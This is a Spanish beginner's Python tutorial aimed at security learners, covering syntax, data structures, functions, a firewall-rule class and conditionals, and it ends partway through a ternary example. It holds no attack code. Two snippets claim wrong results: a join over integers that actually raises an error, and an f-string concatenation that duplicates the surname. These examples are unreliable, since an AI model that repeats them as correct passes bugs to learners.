# Python, de 0 a Hacker

## Introducción

### Historia de Python
Python fue creado por Guido van Rossum, un programador holandés que trabajaba en el Centro para las Matemáticas y la Informática (CWI) en Ámsterdam. A finales de los años 80, Guido estaba trabajando en el sistema operativo distribuido Amoeba y necesitaba un lenguaje de scripting que fuera más potente que el shell de Unix pero más simple que C. Durante las vacaciones de Navidad de 1989, decidió crear un nuevo lenguaje de programación como un proyecto paralelo. El nombre "Python" no proviene del reptil, sino de la afición de Guido por el grupo de comediantes británicos "Monty Python's Flying Circus". Guido quería un nombre corto, único y ligeramente misterioso, y siendo fan del programa de comedia británico, eligió Python.

La primera versión oficial, Python 0.9.0, fue lanzada en febrero de 1991 e incluía ya características fundamentales como clases con herencia, manejo de excepciones, funciones y los tipos de datos principales (list, dict, str). Python fue diseñado desde el principio con la filosofía de que el código debe ser legible y que debería haber una forma obvia de hacer las cosas, principios que se reflejaron en el famoso "Zen de Python". A lo largo de los años 90, Python ganó popularidad gradualmente en la comunidad científica y académica. En 2000, Python 2.0 introdujo importantes mejoras como listas por comprensión y un sistema de recolección de basura. Sin embargo, el cambio más significativo llegó en 2008 con Python 3.0, una versión que rompió la compatibilidad con Python 2 para corregir defectos fundamentales del diseño del lenguaje. Aunque la transición fue controvertida y lenta, Python 3 eventualmente se convirtió en el estándar, y el soporte para Python 2 finalizó oficialmente en enero de 2020. Hoy en día, Python es uno de los lenguajes de programación más populares del mundo, usado en desarrollo web, ciencia de datos, inteligencia artificial, automatización, y prácticamente cualquier campo de la tecnología.

### Evolución
- Python 1.0 (1994): Primera versión oficial
- Python 2.0 (2000): Introducción de listas por comprensión
- Python 3.0 (2008): Rediseño del lenguaje (no compatible con Python 2)
- Python 3.x (actual): Mejoras continuas y actualizaciones



### Pros y contras de Python

#### Pros
- Facilidad y simplicidad
- Versatilidad
- Abundancia de librerías y frameworks para todo
- Abundancia de ejemplos de código. Gran comunidad
- Portabilidad
- Multipropósito

#### Contras
- Lenguaje interpretado, no compilado
  - Rendimiento y manejo de memoria
- Sintaxis, indentación
- Limitado en aplicaciones de Front-End y Móviles

### De bash a Python

**Comparación básica: Bash vs Python**

```bash
# Bash
#!/bin/bash
echo "Hola desde Bash"
nombre="Juan"
echo "Hola $nombre"
```

```python
# Python equivalente
#!/usr/bin/env python3
print("Hola desde Python")
nombre = "Juan"
print("Hola " + nombre)
```

**Ejemplo: Listar archivos**

```bash
# Bash
ls -la
```

```python
# Python
import os
archivos = os.listdir('.')
for archivo in archivos:
    print(archivo)
```

### Ejemplos de utilidades de seguridad
- AWS programming and hacking. librería boto3
- Scrapping. librería beautifulsoup
- Webbrowser emulation. selenium
- API fuzzing
- Shellcode and remote shells
- Reverse engineering
- La mayor partes de los exploits disponibles
- Network exploiting and analyisis. scapy
- Data science with AI. tensorflow, pytorch, pandas
- Forensics. File forensics, network forensics, etc.
- Dictionary and bruteforcing. pydictor, psudohash
- Obtención de vulnerabilidades usando bases de datos de vulnerabilidades


### Referencias
- Black Hat Python. Justin Seitz & Tim Arnold
- Python for Web Hackers. Jason Bourny
- Python Scapy Dot11: Programacion en Python para pentesters Wi-Fi, Yago Hansen



## Primeros pasos y sintaxis básica

### Consola

La consola interactiva de Python te permite ejecutar código línea por línea.

```bash
# Abrir la consola de Python
$ python3

# Dentro de la consola
>>> print("Hola")
Hola
>>> 2 + 2
4
>>> nombre = "Ana"
>>> nombre
'Ana'
>>> exit()  # Para salir
```


### Buenas prácticas y normas básicas

#### Shebang
```python
#!/usr/bin/env python3
# si ejecutas /usr/bin/env python3 entras en la consola de Python 3
```

#### Comentarios
```python
# Comentario de línea

"""
Script Name: my_script.py
Description: Brief description of what the script does.
Author: Your Name
Date: YYYY-MM-DD
"""
```

#### Indentación

La indentación en Python es el uso de espacios al inicio de una línea para definir bloques de código. Python usa **4 espacios** por nivel (estándar PEP 8).

Ejemplo 1: Función simple
```python
# ✅ CORRECTO
def saludar():
    print("Hola")           # 4 espacios
    print("Bienvenido")     # 4 espacios

saludar()
```

```python
# ❌ ERROR - Sin indentación
def saludar():
print("Hola")              # IndentationError!
print("Bienvenido")
```

Ejemplo 2: Condicionales anidadas
```python
# ✅ CORRECTO - Múltiples niveles
edad = 20
tiene_id = True

if edad >= 18:                              # Nivel 0
    print("Eres mayor de edad")             # Nivel 1: 4 espacios
    if tiene_id:                            # Nivel 1: 4 espacios
        print("Acceso permitido")           # Nivel 2: 8 espacios
    else:                                   # Nivel 1: 4 espacios
        print("Necesitas ID")               # Nivel 2: 8 espacios
else:                                       # Nivel 0
    print("Eres menor de edad")             # Nivel 1: 4 espacios
```


##### Reglas clave

- Usa **4 espacios** por nivel
- Sé **consistente** en todo el código
- **NO mezcles** tabs y espacios
- Evita más de 3-4 niveles de anidación


### Python IDE

Un **Python IDE** (Entorno de Desarrollo Integrado, por sus siglas en inglés) es una aplicación que proporciona todas las herramientas necesarias para **escribir, ejecutar, depurar y organizar código en Python** desde un solo lugar. Un buen IDE para Python suele incluir características como resaltado de sintaxis, autocompletado de código, ejecución directa de scripts, depuración paso a paso, manejo de proyectos y acceso integrado a la consola. Algunos ejemplos populares de IDEs para Python son **PyCharm**, **Visual Studio Code**, **Thonny** y **IDLE** (el editor oficial incluido con Python). Usar un IDE facilita mucho el trabajo del programador, especialmente cuando está aprendiendo o desarrollando proyectos más complejos.

- PyCharm (Jetbrains)
- Visual Studio Code (Microsoft)
- Sublime



## Estructuras de datos

### Variables

Las variables son estructuras de datos que se usan para almacenar valores de diversos tipos (numeros, cadenas de texto, listas, etc.) que pueden variar o ser de tipo constante o fijo. Para definirlas se utiliza el símbolo igual "=".

**Tipos de Variables en Python:**

- Cadenas o strings
- Enteros
- De coma flotante
- De tipo array (listas, tuplas, conjuntos, diccionarios)
- De tipo bit


#### Cadenas de texto o strings

Pueden contener pequeñas o grandes cantidades de texto, además de caracteres especiales o de otros idiomas o páginas de código.

```python
mi_variable = "Hola Mundo!"
```


##### Print

Es una de las funciones más utilizadas y sirver para mostrar valores en pantalla. Puede imprimir cualquier tipo de variable.

```python
# Imprimir texto simple
print("Hola Mundo")

# Imprimir múltiples elementos
nombre = "Ana"
edad = 25
print("Nombre:", nombre, "Edad:", edad)
# Nombre: Ana Edad: 25
```

##### Uso de comillas y comillas dobles

Aquí tienes un ejemplo muy simple que muestra cómo usar comillas simples (' ') y comillas dobles (" ") en Python.Ambas comillas funcionan igual para definir cadenas de texto en Python. Puedes usar una u otra según te convenga, por ejemplo:

- Si tu texto contiene comillas dobles dentro: usa comillas simples afuera.
- Si contiene comillas simples dentro: usa comillas dobles afuera.

```python
nombre = 'Alice'
mensaje = "Hola, " + nombre + "!"
print(mensaje)
```

##### Formatos

En Python 2 y anteriores y en otros lenguages de programación se utiliza el formato clásico de printf con "%".

```python
nombre = "Juan"
años = 3
proporcion = 0.1
animal = "camellos"

mensaje = "En %d años yo he visto %g %s." % (años, proporcion, animal)
print(mensaje)
# En 3 años yo he visto 0.1 camellos.

# Otros formatos
print("Nombre: %s, Edad: %d" % ("Ana", 25))
# Nombre: Ana, Edad: 25
```

Pero resulta más práctico usar el formato mediante uso de f-strings (recomendado - Python 3.6+)

```python
nombre = "María"
edad = 30
altura = 1.65

# f-strings: formato más moderno y legible
print(f"Hola, soy {nombre}")
print(f"Tengo {edad} años y mido {altura} metros")
# Hola, soy María
# Tengo 30 años y mido 1.65 metros

# Con expresiones
precio = 100
descuento = 20
print(f"Precio final: ${precio - descuento}")
# Precio final: $80

# Formateo de números
pi = 3.14159265359
print(f"Pi con 2 decimales: {pi:.2f}")
# Pi con 2 decimales: 3.14
```

Uso de índices: En Python, las cadenas de tipo string funcionan como listas de caracteres, pudiendo indexarse por el orden de los caracteres del 0 a n.

```python
texto = "Python"

# Acceder a caracteres individuales
print(texto[0])   # 'P' - primer carácter
print(texto[1])   # 'y' - segundo carácter
print(texto[-1])  # 'n' - último carácter
print(texto[-2])  # 'o' - penúltimo carácter

# Slicing (rebanadas)
print(texto[:3])   # 'Pyt' - desde el inicio hasta el índice 3
print(texto[3:])   # 'hon' - desde el índice 3 hasta el final
print(texto[1:4])  # 'yth' - desde el índice 1 hasta el 4
print(texto[:-1])  # 'Pytho' - todo excepto el último
```

Concatenación: Para concatenar cadenas de texto se puede utilizar el símbolo más "+" de forma general, aunque como ya hemos visto, resulta más práctico el uso del f-string.

```python
# Unir cadenas con +
nombre = "Ana"
apellido = "García"
nombre_completo = nombre + " " + apellido
print(nombre_completo)  # "Ana García"

# Utilizar formato f-string
nombre = "Ana"
apellido = "García"
print(f"{nombre_completo} {apellido}")  # "Ana García"

# Repetir cadenas
print("Hola " * 3)  # "Hola Hola Hola "

# Concatenar con números (convertir primero)
edad = 25
mensaje = "Tengo " + str(edad) + " años"
print(mensaje)  # "Tengo 25 años"
```

Unicode y caracteres especiales: En la mayoría de lenguajes de programación se permite el uso de caracteres especiales como el retorno de carro "\n", el tabulador "\t" para tabular columnas, así como el uso de caracteres no ASCII o unicode, además de caracteres de tipo binario o bits.

```python
# Caracteres especiales
mensaje = "Línea 1\nLínea 2\nLínea 3"
print(mensaje)
# Línea 1
# Línea 2
# Línea 3

# Tabulaciones
print("Nombre:\tJuan\nEdad:\t25")
# Nombre: Juan
# Edad:   25 

# Unicode
print("Símbolos: ★ ♥ € ñ á")
```

##### User input

La función `input()` permite recibir datos del usuario durante la ejecución del programa.

```python
# Pedir el nombre al usuario
nombre = input("¿Cuál es tu nombre? ")
print(f"Hola, {nombre}!")

# Ejemplo de ejecución:
# ¿Cuál es tu nombre? Juan
# Hola, Juan!
```


#### Alcance

- Local. Pare el uso dentro de una función o clase.
- Global. Para el uso general en cualquier función o clase

```python
# Variable global
nombre_global = "Soy global"

def mi_funcion():
    # Variable local
    nombre_local = "Soy local"
    print(nombre_global)  # Puedo acceder a la global
    print(nombre_local)   # Puedo acceder a la local

mi_funcion()
print(nombre_global)   # Funciona
print(nombre_local)    # ❌ Error: no existe fuera de la función
```

#### Enteros

Los enteros son variables de tipo numérico entero, no decimal.

```python
# Entero
edad = 10
print(type(edad))          # <class 'int'>

# Float (decimal)
temperatura = 10.2
print(type(temperatura))   # <class 'float'>

# Hexadecimal (base 16)
hex_num = 0xA              # 10 en decimal
print(hex_num)             # 10

# Octal (base 8)
oct_num = 0o12             # 10 en decimal
print(oct_num)             # 10
```
- Entero (10)
- Float (10.2)
- Hexadecimal (0xA)
- Octal (0o12)

##### Operaciones matemáticas básicas

Python permite de forma genérica, sin el uso de librerías externas, realizar operaciones aritméticas simples. Para operaciones más avanzadas se utilizan librerias externas como "math" que incluye operaciones como: sqrt(), sin(), cos(), log(), pow().

```python
a = 10
b = 3

# Suma
print(a + b)  # 13

# Resta
print(a - b)  # 7

# Multiplicación
print(a * b)  # 30

# División
print(a / b)  # 3.333...

# División entera (truncada)
print(a // b)  # 3

# Potencia
print(a ** b)  # 1000 (10 elevado a 3)

# Módulo (resto de la división)
print(a % b)  # 1
```

Uso de variables en operaciones:
```python
# Operaciones con variables
precio = 100
descuento = 20
precio_final = precio - descuento
print(f"El precio final es: ${precio_final}")  # El precio final es: $80

# Reasignar valores
contador = 0
contador = contador + 1   # Ahora contador vale 1
contador += 1             # Forma corta, ahora vale 2
print(contador)           # 2
```


Ejemplo: Par o impar?
```python
# Verificar si un número es par o impar comprobando el resto
numero = 17
if numero % 2 == 0:
    print(f"{numero} es par")
else:
    print(f"{numero} es impar")  # 17 es impar
```



#### Booleanos

Los booleanos o variables lógicas solo pueden obtener el valor "Verdadero" o "Falso" y se usan en cualquier tipo de situación donde solo se esperan dos opciones. El uso de booleanos se representaba en otros lenguajes como "1" o "0", ya que son de tipo binario.

Ejemplo: Valores booleanos y comparaciones
```python
# Valores booleanos básicos
verdadero = True
falso = False

print(verdadero)  # True
print(falso)      # False

# Comparaciones que retornan booleanos
print(5 > 3)      # True
print(5 < 3)      # False
print(5 == 5)     # True (igualdad)
print(5 != 3)     # True (diferente)
print(5 >= 5)     # True (mayor o igual)
```

Ejemplo: Operadores lógicos
```python
# AND (ambos deben ser verdaderos)
print(True and True)   # True
print(True and False)  # False

# OR (al menos uno debe ser verdadero)
print(True or False)   # True
print(False or False)  # False

# NOT (invierte el valor)
print(not True)        # False
print(not False)       # True

# Ejemplo práctico
edad = 20
tiene_licencia = True
puede_conducir = edad >= 18 and tiene_licencia
print(f"¿Puede conducir? {puede_conducir}")  # True
```

#### Variables no definidas o None

En muchas ocasiones, una función u operación puede retornar un valor esperado o no hacerlo. Cuando no lo hace, puede retornar un valor nulo o no estar definida.

Ejemplo: Valor None
```python
# None representa "sin valor" o "vacío" (función sin retorno)
resultado = None
print(resultado)          # None

# Usar None como valor inicial
nombre = None
if nombre is None:
    print("No hay nombre definido")
    nombre = "Juan"
print(nombre)             # Juan
```

**¿Qué NO representa None?**
| Concepto | ¿Es igual a `None`? | Explicación |
|-----------|--------------------|--------------|
| `0` | ❌ No | `0` es un número entero. |
| `""` (cadena vacía) | ❌ No | Es una cadena con longitud 0. |
| `[]` (lista vacía) | ❌ No | Es una lista existente, pero vacía. |
| `False` | ❌ No | `None` no es lo mismo que falso, aunque ambos se evalúan como *Falsey* en condicionales. |


#### Métodos

Los métodos son funciones de gran utilidad que se aplican a objetos como cadenas, enteros, etc. Su uso es cotidiano y deben de conocerse ya que forman la base de cualquier lenguaje de programación.

Ejemplo: Métodos de cadenas
```python
texto = "Hola Mundo"

# Ver todos los métodos disponibles
# print(dir(texto))

# Longitud de la cadena
print(len(texto))  # 10

# Convertir a minúsculas
print(texto.lower())       # "hola mundo"

# Convertir a mayúsculas
print(texto.upper())       # "HOLA MUNDO"

# Convertir a tipo frase
print(texto.capitalize())  # "Hola mundo"

# Convertir a Titulos
print(texto.title())       # "Hola Mundo"

# Dividir la cadena
palabras = texto.split()   # Divide por espacios
print(palabras)            # ['Hola', 'Mundo']

# Ejemplo con email
email = "usuario@ejemplo.com"
usuario, dominio = email.split('@')
print(f"Usuario: {usuario}")           # Usuario: usuario
print(f"Dominio: {dominio}")           # Dominio: ejemplo.com
```

Ejemplo: Más métodos útiles
```python
frase = "  Python es genial  "

# Eliminar espacios al inicio y final
print(frase.strip())                         # "Python es genial"

# Reemplazar texto
print(frase.replace("genial", "increíble"))  # "  Python es increíble  "

# Verificar si empieza con algo
print(frase.strip().startswith("Python"))    # True

# Contar ocurrencias
print("banana".count("a"))                   # 3
```

---

### Arrays o colecciones

Los arrays o colecciones son estructuras de datos multidimensional, ya que a diferencia de las variables, permiten trabajar con multiples datos en un solo objeto. Se utilizan como diccionarios, listas, bases de datos, sumas de objetos, etc.

#### Listas o `list()`

Una lista es un objeto que almacena multiples valores en un orden establecido. Esta lista de valores no es inmutable y puede modificarse, crecer o reducirse mediante diferentes operaciones.

```python
# Crear una lista
lista = [1, 3, 5, 7, 9]
print(lista)  # [1, 3, 5, 7, 9]

# Lista con diferentes tipos
mixta = [1, "texto", 3.14, True]
print(mixta)  # [1, 'texto', 3.14, True]

# Lista vacía
vacia = []
# o también: vacia = list()
```

Ejemplo: Acceder a elementos
```python
frutas = ["manzana", "banana", "cereza", "durazno"]

# Acceder por índice
print(frutas[0])   # "manzana" - primer elemento
print(frutas[2])   # "cereza"
print(frutas[-1])  # "durazno" - último elemento

# Lista de listas (matriz)
matriz = [
    [1, 2, 3],
    [4, 5, 6],
    [7, 8, 9]
]
print(matriz[0][0])  # 1
print(matriz[1][2])  # 6
```

Métodos de listas:
```python
numeros = [2, 1, 4, 3]

# append() - añadir al final
numeros.append(5)
print(numeros)  # [2, 1, 4, 3, 5]

# extend() - añadir múltiples elementos
numeros.extend([7, 6])
print(numeros)  # [2, 1, 4, 3, 5, 7, 6]

# sort() - ordenar
numeros.sort()
print(numeros)  # [1, 2, 3, 4, 5, 6, 7]

# sort(reverse=True) - ordenar descendente
numeros.sort(reverse=True)
print(numeros)  # [7, 6, 5, 4, 3, 2, 1]

# pop() - eliminar y retornar el último
ultimo = numeros.pop()
print(ultimo)   # 1
print(numeros)  # [7, 6, 5, 4, 3, 2]

# del - eliminar por índice
del numeros[0]
print(numeros)  # [6, 5, 4, 3, 2]
```

Índices de una lista:
```python
lista = [1, 3, 5, 7]
print(lista[0])                    # 1

# Lista de listas
lista_listas = [[1, 2], [3, 4]]
print(lista_listas[0][0])          # 1
```

Ejemplo para convertir a csv una lista
```python
lista = [1, 3, 5, "pan"]
csv = ','.join(lista)
print(csv)                # "1,3,5,pan"
```


#### Conjuntos o `set()`

Los conjuntos son colecciones sin orden fijo y sin elementos duplicados. Esto ayuda a mantener una lista libre de duplicados, por lo tanto con valores únicos.

```python
# Crear un conjunto o set
consonantes = set(['b', 'c', 'd', 'f','b'])
print(consonantes)  # {'f', 'c', 'd', 'b'} (el orden puede variar)

# Otra forma de crear conjuntos
numeros = {1, 2, 3, 4, 5, 1}
print(numeros)  # {1, 2, 3, 4, 5}    # Los duplicados se eliminan automáticamente
```

Ejemplo: Operaciones con conjuntos
```python
a = {1, 2, 3, 4}
b = {3, 4, 5, 6}

# Unión (elementos en a o b)
print(a | b)  # {1, 2, 3, 4, 5, 6}

# Intersección (elementos en a y b)
print(a & b)  # {3, 4}

# Diferencia (elementos en a pero no en b)
print(a - b)  # {1, 2}

# Añadir elemento
a.add(7)
print(a)     # {1, 2, 3, 4, 7}
```

#### Tuplas o `tuple()`

Las tuplas son como listas pero **inmutables** (no se pueden modificar después de creadas).

```python
# Crear tuplas
vocales = ("a", "e", "i", "o", "u")
print(vocales)  # ('a', 'e', 'i', 'o', 'u')

# También sin paréntesis
dias = "lunes", "martes", "miércoles"
print(dias)  # ('lunes', 'martes', 'miércoles')

# Acceder a elementos (como en listas)
print(vocales[0])   # 'a'
print(vocales[-1])  # 'u'
```

Ejemplo: ¿Por qué usar tuplas?
```python
# Las tuplas son inmutables
coordenadas = (10, 20)
print(coordenadas)       # (10, 20)

# Esto daría error:
# coordenadas[0] = 15    # ❌ TypeError

# Desempaquetar tuplas
x, y = coordenadas
print(f"x: {x}, y: {y}")  # x: 10, y: 20

# Intercambiar valores fácilmente
a = 5
b = 10
a, b = b, a
print(f"a: {a}, b: {b}")  # a: 10, b: 5
```

Ejemplo: Retornar múltiples valores desde una tupla
```python
def obtener_dimensiones():
    ancho = 1920
    alto = 1080
    return ancho, alto  # Retorna una tupla

# Recibir los valores
w, h = obtener_dimensiones()
print(f"Resolución: {w}x{h}")  # Resolución: 1920x1080
```

#### Diccionarios o `dict()`

Los diccionarios almacenan pares clave-valor. Son muy útiles para organizar datos relacionados entre si.

```python
# Crear un diccionario
services = {"FTP": 21, "SSH": 22, "SMTP": 25, "HTTP": 80}
print(services)  # {'FTP': 21, 'SSH': 22, 'SMTP': 25, 'HTTP': 80}

# Acceder a valores por clave
print(services['SSH'])  # 22
print(services['HTTP']) # 80

# Añadir nuevos elementos
services['HTTPS'] = 443
print(services)  # {'FTP': 21, 'SSH': 22, 'SMTP': 25, 'HTTP': 80, 'HTTPS': 443}
```

Ejemplo: Diccionario de información personal
```python
persona = {
    "nombre": "Juan",
    "edad": 30,
    "ciudad": "Madrid",
    "profesion": "Programador"
}

print(persona["nombre"])     # Juan
print(persona["profesion"])  # Programador

# Modificar valores
persona["edad"] = 31
print(persona["edad"])  # 31
```

**Métodos importantes:**

```python
services = {"FTP": 21, "SSH": 22, "HTTP": 80}

# get() - obtener valor (con valor por defecto si no existe)
print(services.get("SSH"))         # 22
print(services.get("HTTPS", 443))  # 443 (retorna 443 si no existe)

# Actualizar con otro diccionario
services2 = {"HTTPS": 443, "DNS": 53}
services.update(services2)
print(services)  # {'FTP': 21, 'SSH': 22, 'HTTP': 80, 'HTTPS': 443, 'DNS': 53}

# pop() - eliminar y retornar valor
puerto_ftp = services.pop("FTP")
print(puerto_ftp)  # 21
print(services)    # Ya no está FTP

# del - eliminar clave
del services["DNS"]
print(services)  # DNS eliminado

# clear() - vaciar diccionario
services_temp = {"A": 1, "B": 2}
services_temp.clear()
print(services_temp)  # {}
```

Ejemplo: Iterar sobre diccionarios
```python
estudiantes = {
    "Ana": 95,
    "Luis": 87,
    "María": 92
}

# Iterar sobre claves
for nombre in estudiantes:
    print(nombre)
# Ana
# Luis
# María

# Iterar sobre valores
for nota in estudiantes.values():
    print(nota)
# 95
# 87
# 92

# Iterar sobre clave y valor
for nombre, nota in estudiantes.items():
    print(f"{nombre}: {nota}")
# Ana: 95
# Luis: 87
# María: 92
```


### Identificación de tipos

En muchos casos, recibimos un valor de una función desconocida o librería y debemos averiguar cual es el tipo de dato que nos está retornando. PAra ello podemos usar la función "type".

La función `type()` te permite saber qué tipo de dato es una variable.

```python
# Verificar tipos de datos
numero = 42
print(type(numero))  # <class 'int'>

decimal = 3.14
print(type(decimal))  # <class 'float'>

texto = "Hola"
print(type(texto))  # <class 'str'>

lista = [1, 2, 3]
print(type(lista))  # <class 'list'>

diccionario = {"clave": "valor"}
print(type(diccionario))  # <class 'dict'>

booleano = True
print(type(booleano))  # <class 'bool'>
```

Métodos de conversión entre tipos:
```python
# Convertir string a entero
edad_str = "25"
edad_int = int(edad_str)
print(type(edad_int))  # <class 'int'>
print(edad_int + 5)    # 30

# Convertir a float
numero_str = "3.14"
numero_float = float(numero_str)
print(numero_float * 2)  # 6.28

# Convertir a string
numero = 100
numero_str = str(numero)
mensaje = "El número es: " + numero_str
print(mensaje)  # El número es: 100

# Convertir a lista
texto = "Python"
lista_letras = list(texto)
print(lista_letras)  # ['P', 'y', 't', 'h', 'o', 'n']
```


## Funciones

Las funciones son bloques de código reutilizable que realizan una tarea específica.

**Ejemplo básico:**
```python
# Definir una función simple
def saludar():
    print("¡Hola!")
    print("Bienvenido a Python")

# Llamar a la función
saludar()
# ¡Hola!
# Bienvenido a Python
```

### Input arguments (Argumentos de entrada)

**Ejemplo: Funciones con parámetros**
```python
# Función con un parámetro
def saludar_persona(nombre):
    print(f"Hola, {nombre}!")

saludar_persona("Ana")   # Hola, Ana!
saludar_persona("Luis")  # Hola, Luis!

# Función con múltiples parámetros
def suma(a, b):
    resultado = a + b
    print(f"{a} + {b} = {resultado}")

suma(5, 3)   # 5 + 3 = 8
suma(10, 20) # 10 + 20 = 30

# Parámetros con valores por defecto
def presentar(nombre, edad=18):
    print(f"Me llamo {nombre} y tengo {edad} años")

presentar("Juan", 25)  # Me llamo Juan y tengo 25 años
presentar("Ana")       # Me llamo Ana y tengo 18 años
```

### Returns (Retornar valores)

**Ejemplo: Funciones que retornan valores**
```python
# Función que retorna un valor
def sumar(a, b):
    return a + b

resultado = sumar(10, 5)
print(resultado)  # 15

# Usar el resultado en operaciones
total = sumar(20, 30) + sumar(5, 5)
print(total)  # 60

# Función con múltiples returns
def es_par(numero):
    if numero % 2 == 0:
        return True
    else:
        return False

print(es_par(4))  # True
print(es_par(7))  # False

# Función que retorna múltiples valores
def calcular_rectangulo(ancho, alto):
    area = ancho * alto
    perimetro = 2 * (ancho + alto)
    return area, perimetro  # Retorna una tupla

a, p = calcular_rectangulo(5, 3)
print(f"Área: {a}, Perímetro: {p}")  # Área: 15, Perímetro: 16
```

### Main function

La función `main()` es una convención para organizar el código principal del programa.

**Ejemplo básico:**
```python
# Global variables
x = 10

def saludar():
    print("Hola desde la función saludar")

def main():
    # Código principal aquí
    print("Iniciando programa...")
    print(f"Variable global x: {x}")
    saludar()
    print("Programa finalizado")

# Solo ejecutar main si este archivo se ejecuta directamente
if __name__ == "__main__":
    main()

# Salida:
# Iniciando programa...
# Variable global x: 10
# Hola desde la función saludar
# Programa finalizado
```

**¿Por qué usar `if __name__ == "__main__":`?**

Esto permite que el archivo pueda:
- Ejecutarse como programa principal
- Importarse como módulo sin ejecutar el código principal

```python
# archivo: utilidades.py
def sumar(a, b):
    return a + b

def main():
    print("Ejecutando utilidades.py")
    print(f"5 + 3 = {sumar(5, 3)}")

if __name__ == "__main__":
    main()  # Solo se ejecuta si ejecutamos este archivo directamente

# Si hacemos: python utilidades.py
# Salida: Ejecutando utilidades.py
#         5 + 3 = 8

# Si importamos: from utilidades import sumar
# No se ejecuta main(), solo importa la función sumar
```


### Uso de Clases y objetos

Este código define una clase llamada FirewallRule que representa una regla de firewall: especifica si se debe permitir o bloquear el tráfico de red desde una IP origen a una IP destino en un puerto específico. Cada objeto de esta clase contiene los datos de una regla y puede mostrarla o evaluar si cierto tráfico está permitido. Este ejemplo es ideal para aprender sobre clases, atributos, métodos y lógica condicional en Python aplicados a un caso práctico de ciberseguridad.

**Ejemplo de uso clases: `classFirewallRule.py`**

```python
# Clase para representar una regla de firewall
class ReglaFirewall:
    def __init__(self, ip_origen, ip_destino, puerto, accion):
        """
        Inicializa una regla de firewall.
        :param ip_origen: IP de origen (ej. "192.168.1.10")
        :param ip_destino: IP de destino (ej. "10.0.0.5")
        :param puerto: Número de puerto (ej. 80)
        :param accion: "permitir" o "denegar"
        """
        self.ip_origen = ip_origen
        self.ip_destino = ip_destino
        self.puerto = puerto
        self.accion = accion.lower()  # Aseguramos que siempre esté en minúsculas

    def mostrar_regla(self):
        """Imprime la regla en formato legible."""
        print(f"Regla: {self.accion.upper()} tráfico de {self.ip_origen} hacia {self.ip_destino} en el puerto {self.puerto}")

    def esta_permitido(self, ip_origen, puerto):
        """
        Verifica si una conexión desde cierta IP y puerto está permitida por esta regla.
        :param ip_origen: IP de origen a comprobar
        :param puerto: Puerto a comprobar
        :return: True si está permitido, False si no
        """
        if self.ip_origen == ip_origen and self.puerto == puerto:
            return self.accion == "permitir"
        return False


# Crear objetos (reglas) de ejemplo
regla1 = ReglaFirewall("192.168.1.10", "10.0.0.5", 80, "permitir")
regla2 = ReglaFirewall("192.168.1.20", "10.0.0.5", 22, "denegar")

# Mostrar las reglas creadas
regla1.mostrar_regla()  # Salida: PERMITIR tráfico de 192.168.1.10 hacia 10.0.0.5 en el puerto 80
regla2.mostrar_regla()  # Salida: DENEGAR tráfico de 192.168.1.20 hacia 10.0.0.5 en el puerto 22

# Probar si ciertas conexiones están permitidas
print(regla1.esta_permitido("192.168.1.10", 80))  # True → la regla permite este tráfico
print(regla2.esta_permitido("192.168.1.20", 22))  # False → la regla explícitamente lo bloquea

```


## Condiciones, switches y bucles

Esta sección explora las estructuras fundamentales que permiten a un programa tomar decisiones y repetir acciones.

### If, elif, else

Las estructuras if, elif y else se utilizan para tomar decisiones en un programa. Permiten ejecutar diferentes bloques de código dependiendo de si una condición es verdadera o falsa. Por ejemplo, con if puedes comprobar si una variable cumple cierta condición, elif (abreviatura de “else if”) permite agregar más condiciones alternativas, y else se ejecuta solo si ninguna de las anteriores fue verdadera. Esta lógica condicional es esencial para controlar el flujo del programa y reaccionar ante diferentes situaciones. Aprender a usar if, elif y else es uno de los primeros pasos clave en programación.

```python
edad = 20

if edad >= 18:
    print("Eres mayor de edad")
else:
    print("Eres menor de edad")
# Eres mayor de edad
```

Ejemplo: if-elif-else
```python
nota = 85

if nota >= 90:
    print("Calificación: A (Excelente)")
elif nota >= 80:
    print("Calificación: B (Muy bien)")
elif nota >= 70:
    print("Calificación: C (Bien)")
elif nota >= 60:
    print("Calificación: D (Suficiente)")
else:
    print("Calificación: F (Insuficiente)")
# Calificación: B (Muy bien)
```

Ejemplo: Programa interactivo
```python
print("=== Calculadora de IMC ===")
nombre = input("Tu nombre: ")
peso = float(input("Tu peso en kg: "))
altura = float(input("Tu altura en metros: "))

imc = peso / (altura ** 2)
print(f"\n{nombre}, tu IMC es: {imc:.2f}")

if imc < 18.5:
    print("Peso bajo")
elif imc < 25:
    print("Peso normal")
elif imc < 30:
    print("Sobrepeso")
else:
    print("Obesidad")
```

Ejemplo: Condiciones con strings
```python
nombre = "Juan"

# Verificar si string tiene contenido
if nombre:
    print(f"Hola, {nombre}")  # Se ejecuta porque nombre no está vacío

# Comparar strings
if nombre == "Juan":
    print("El nombre es Juan")  # Se ejecuta

# Verificar si un texto está dentro de otro
nombre_completo = "Yago Hansen"
if "Hansen" in nombre_completo:
    print("El apellido Hansen está presente")  # Se ejecuta
```

Ejemplo: String vacío
```python
texto = ""

if texto:
    print("Hay texto")
else:
    print("No hay texto")  # Se ejecuta porque texto está vacío
```

Ejemplo: Condiciones con listas
```python
frutas = ["manzana", "banana", "cereza"]

# Verificar si lista tiene elementos
if frutas:
    print("Hay frutas en la lista")  # Se ejecuta

# Verificar si un elemento está en la lista
if "banana" in frutas:
    print("Tenemos bananas")  # Se ejecuta

# Lista vacía
lista_vacia = []
if lista_vacia:
    print("Tiene elementos")
else:
    print("La lista está vacía")  # Se ejecuta
```

Ejemplo: Condiciones con booleanos
```python
tiene_licencia = True
mayor_de_edad = True

if tiene_licencia:
    print("Tiene licencia de conducir")  # Se ejecuta

# Combinar condiciones
if tiene_licencia and mayor_de_edad:
    print("Puede conducir")  # Se ejecuta

# Negación
if not tiene_licencia:
    print("No tiene licencia")
else:
    print("Tiene licencia")  # Se ejecuta
```



#### Anidación de condiciones

**Ejemplo: Condiciones anidadas**
```python
edad = 25
tiene_licencia = True

if edad >= 18:
    if tiene_licencia:
        print("Puede conducir")
    else:
        print("Mayor de edad pero sin licencia")
else:
    print("Menor de edad")
# Puede conducir

# Forma compacta (en una línea)
categoria = (edad >= 18 and "Adulto") or "Menor"
print(categoria)  # Adulto
```

#### Negación

**Ejemplo: Operador not**
```python
llueve = False

if not llueve:
    print("Vamos al parque")  # Se ejecuta
else:
    print("Nos quedamos en casa")

# Negación con in
numero = 5
numeros_pares = [2, 4, 6, 8]

if numero not in numeros_pares:
    print(f"{numero} no es par")  # Se ejecuta
```

#### Uso en variables

**Ejemplo: Asignación condicional (operador ternario)**
```python
edad = 20

# Forma tradicional
if edad >= 18:
    mensaje = "Mayor de edad"
else:
    mensaje = "Menor de edad"
print(mensaje)  # Mayor de edad

